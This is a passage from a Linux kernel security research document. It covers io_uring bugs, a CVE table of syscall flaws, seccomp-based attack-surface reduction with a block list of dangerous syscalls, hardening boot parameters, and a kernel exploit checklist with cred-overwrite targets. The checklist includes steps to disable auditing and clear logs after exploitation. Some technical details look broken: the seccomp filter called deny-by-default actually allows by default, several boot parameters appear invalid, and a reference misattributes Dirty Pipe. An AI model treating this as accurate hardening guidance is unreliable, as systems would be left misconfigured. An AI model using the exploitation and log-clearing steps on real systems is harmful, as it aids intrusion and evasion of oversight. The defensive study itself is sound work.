// In fs/io_uring.c:
// The completion queue ring buffer could overflow when:
// 1. Submission queue has N pending entries
// 2. Completion events are generated faster than consumed
// 3. The CQ ring head/tail wrap around incorrectly
// 4. Leading to out-of-bounds write in the CQ ring buffer

// io_uring was introduced in 5.1 and had dozens of bugs in
// its first 2 years. It represents the largest single new
// attack surface in recent kernels.
```

#### 5.3.5 Notable Syscall Interface Design Flaws

| Flaw                     | Description                                              | Examples                            |
|--------------------------|----------------------------------------------------------|--------------------------------------|
| Complex state machines   | io_uring, eBPF, v4l2 have deep state complexity         | CVE-2020-29374, CVE-2022-2602       |
| Inconsistent validation | Different paths validate differently                     | CVE-2022-0847 (Dirty Pipe)          |
| TOCTOU races             | Time-of-check/time-of-use between validation and use     | CVE-2019-18683, many others         |
| Pointer handling         | Dual-user/kernel pointers easy to mishandle              | CVE-2019-17666                      |
| Integer overflow         | Size calculations overflow before use                    | CVE-2017-7308                       |
| Uninitialized data       | Leaking stack/heap data through copy_to_user             | CVE-2020-26541                      |
| Reference count bugs     | get/put imbalances leading to UAF                       | CVE-2016-0728                       |
| Capability checks        | Missing or incorrect capability checks                  | CVE-2021-4034 (PwnKit)              |
| Copy-up semantics        | OverlayFS copy-up preserving privileged bits             | CVE-2023-0386                       |

### 5.4 Attack Surface Reduction Strategy

Reducing the syscall attack surface for production workloads:

```bash
# 1. Audit available syscalls for the workload
#    Use strace to identify required syscalls:
strace -c -f ./application 2>&1 | head -40

# 2. Create a seccomp-bpf whitelist
#    Tools: seccomp-profiles, docker-defaults, systemd-syscall-filter

# 3. Block known-dangerous syscalls:
#    - bpf (unless needed)          — eBPF program loading
#    - perf_event_open (unless needed) — perf counter access
#    - keyctl                        — key management attacks
#    - request_key / add_key         — keyring attacks
#    - userfaultfd (unless needed)   — kernel fault handler abuse
#    - io_uring_setup (unless needed)— io_uring attack surface
#    - ptrace                       — process inspection
#    - process_vm_readv/writev       — cross-process memory R/W

# 4. Use kernel hardening boot parameters:
#    slab_nomerge        # Don't merge slab caches
#    slub_debug=P        # Poison freed slab objects
#    init_on_alloc=1     # Zero-initialize allocations
#    init_on_free=1      # Zero-initialize on free
#    page_alloc.shuffle=1 # Randomize page allocation order
#    hardened_usercopy=1  # Strict copy_{to,from}_user checks
#    kvm.nx_huge_pages=1  # KVM NX huge pages
```

```c
// 5. Recommended seccomp filter for container workloads:
//    ( whitelist approach — deny by default )

struct sock_filter container_filter[] = {
    // Load architecture
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
             offsetof(struct seccomp_data, arch)),
    // Verify x86-64
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 3),
    // Load syscall number
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
             offsetof(struct seccomp_data, nr)),
    // Block dangerous syscalls
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_bpf, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_keyctl, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
    // ... more blocked syscalls ...
    // Default: allow
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};
```

---

## Appendix A: Quick Reference — Ring 3 to Ring 0 Exploit Checklist

```
[ ] 1. Information Gathering
    ├── [ ] Identify kernel version and config
    ├── [ ] Check /proc/version, /proc/cmdline
    ├── [ ] Enumerate enabled mitigations (SMEP, SMAP, KASLR, KPTI, CFI)
    ├── [ ] Determine kernel base address (KASLR bypass)
    └── [ ] Check /sys/kernel/notes, /sys/kernel/mm/...

[ ] 2. Vulnerability Discovery
    ├── [ ] Enumerate accessible attack surfaces (ioctl, /dev, netlink)
    ├── [ ] Run syzkaller or manual fuzzing
    ├── [ ] Audit kernel source for bug classes
    └── [ ] Check for known CVEs matching kernel version

[ ] 3. Vulnerability Analysis
    ├── [ ] Determine bug class (UAF, OOB, race, type confusion)
    ├── [ ] Determine primitives achieved (read/write/execute)
    ├── [ ] Assess heap/slab constraints
    └── [ ] Evaluate exploitation difficulty

[ ] 4. Exploitation
    ├── [ ] Achieve info leak (defeat KASLR)
    ├── [ ] Achieve arbitrary read/write primitive
    ├── [ ] Bypass SMEP (use kernel ROP)
    ├── [ ] Bypass SMAP (use kernel heap as ROP stack)
    ├── [ ] Bypass KPTI (use provided return path)
    ├── [ ] Escalate privileges (commit_creds(prepare_kernel_cred(0)))
    ├── [ ] Return to userspace safely
    └── [ ] Bypass CFI if applicable (type confusion or ROP)

[ ] 5. Post-Exploitation
    ├── [ ] Disable further auditing (auditctl)
    ├── [ ] Hide from forensics (clear logs)
    └── [ ] Persist or exit cleanly
```

## Appendix B: Kernel Hardening Boot Parameters

```
# /etc/default/grub GRUB_CMDLINE_LINUX_DEFAULT appendages:

# Memory initialization
init_on_alloc=1              # Zero-init on allocation (4% performance cost)
init_on_free=1               # Zero-init on free (7% performance cost)
slub_debug=P                 # Poison freed objects (detect UAF sooner)
page_alloc.shuffle=1          # Randomize free page order

# Access control
kptr_restrict=2               # Hide kernel pointers from all users
dmesg_restrict=1              # Restrict dmesg to CAP_SYSLOG
hardened_usercopy=1           # Strict copy_{to,from}_user checks

# Randomization
kaslr                         # Enable KASLR (default on modern kernels)
randomize_va_space=2          # Full ASLR for userspace too

# Mitigations
smep                          # Supervisor Mode Execution Prevention
smap                          # Supervisor Mode Access Prevention
pti                           # Page Table Isolation (Meltdown mitigation)
spectre_v2=                   # Spectre v2 mitigation
spec_store_bypass_disable=    # Speculative Store Bypass disable
l1tf=full                     # L1 Terminal Fault mitigation
mds=full                      # Microarchitectural Data Sampling mitigation

# eBPF restrictions
bpf_disable_jit=1            # Disable eBPF JIT (or bpf_jit_harden=1)

# Module restrictions
module.sig_enforce=1          # Require signed kernel modules
```

## Appendix C: Key Data Structures

```c
// task_struct — The core process descriptor
struct task_struct {
    volatile long state;        // Process state (TASK_RUNNING, etc.)
    int prio;                   // Scheduling priority
    const struct sched_class *sched_class;
    struct sched_entity se;     // CFS scheduling entity
    struct mm_struct *mm;       // Memory descriptor (userspace)
    struct mm_struct *active_mm; // Active mm (kernel threads)
    pid_t pid;                  // Process ID
    pid_t tgid;                 // Thread group ID
    struct task_struct *parent; // Parent process
    struct list_head children;  // Child processes
    struct files_struct *files; // Open file table
    struct nsproxy *nsproxy;    // Namespace proxy
    const struct cred *cred;    // Credential struct (uid, gid, caps)
    // ... 400+ fields total
};

// cred — Process credentials (the target for privilege escalation)
struct cred {
    atomic_t usage;             // Reference count
    kuid_t uid;                 // Real UID
    kgid_t gid;                 // Real GID
    kuid_t suid;                // Saved UID
    kgid_t sgid;                // Saved GID
    kuid_t euid;                // Effective UID
    kgid_t egid;                // Effective GID
    kuid_t fsuid;               // Filesystem UID
    kgid_t fsgid;               // Filesystem GID
    unsigned securebits;        // SUID capability restrictions
    kernel_cap_t cap_inheritable;
    kernel_cap_t cap_permitted;
    kernel_cap_t cap_effective;
    kernel_cap_t cap_bset;      // Bounding set
    kernel_cap_t cap_ambient;   // Ambient capabilities
    unsigned char jit_keyring;  // JIT keyring
    struct key *session_keyring;
    struct key *process_keyring;
    struct key *thread_keyring;
    struct key *request_key_auth;
    void *security;             // LSM security blob
    struct user_struct *user;   // User accounting
    struct group_info *group_info;
    struct rcu_head rcu;        // RCU callback for freeing
};

// Privilege escalation targets:
// 1. Overwrite cred->uid, cred->euid to 0 (root)
// 2. Overwrite cred->cap_effective to ~0 (all capabilities)
// 3. Or: overwrite modprobe_path / core_pattern and trigger execution
```

---

## References

1. Van Schaik, S., et al. "Dirty Pipe: Unprivileged pipe_buffer overwrite (CVE-2022-0847)." 2022.
2. Qualys. "PwnKit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)." 2022.
3. Cowan, C., et al. "StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks." USENIX Security, 1998.
4. Shacham, H. "The Geometry of Innocent Flesh on the Bone: Return-Oriented Programming." CCS, 2007.
5. Hu, H., et al. "Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks." IEEE S&P, 2016.
6. Carlini, N., Wagner, D. "ROP is Still Dangerous: Breaking Modern Defenses." USENIX Security, 2014.
7. Abadi, M., et al. "Control-Flow Integrity." CCS, 2005.
8. Google. [syzkaller — Linux kernel syscall fuzzer](https://github.com/google/syzkaller) — continuous fuzzing infrastructure for Linux kernel bug discovery.
9. NIST. "National Vulnerability Database." CVE entries: CVE-2022-0847, CVE-2021-4154, CVE-2019-18683, CVE-2023-0386, CVE-2021-4034, CVE-2016-0728, CVE-2021-3156, CVE-2016-5195.
10. Dullien, T. "A Brief History of Linux Kernel Exploitation." OffensiveCon, 2020.
11. Corbet, J., et al. "Linux Device Drivers." O'Reilly, 2005.
12. Osborne, M., et al. "eBPF: A New Approach to Observability and Security." Linux Plumbers Conference, 2019.

---

*Document version: 2026-04-26*
*Classification: Technical Research — Attack Methodology*
*Scope: Linux Kernel (x86-64), Versions 5.4 through 6.x*